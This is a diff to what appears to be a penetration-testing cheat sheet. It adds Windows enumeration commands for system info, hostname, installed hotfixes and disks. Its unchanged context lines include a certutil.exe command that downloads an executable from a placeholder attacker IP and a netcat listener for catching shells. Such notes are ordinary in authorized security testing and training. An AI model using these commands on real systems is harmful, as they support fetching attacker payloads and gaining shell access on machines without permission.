@@ -103,6 +103,16 @@ sc query [application]
 
 certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]
 
+### Windows system enumeration
+systeminfo
+
+hostname
+
+(Patching enum) wmic qfe  
+(Patching enum) wmic qfe get Caption,Description,HotFixID,InstalledOn  
+
+(Driver enum) wmic logicaldisk get caption,description,providername  
+
 ## Listener
 nc -nlvp [port]
 
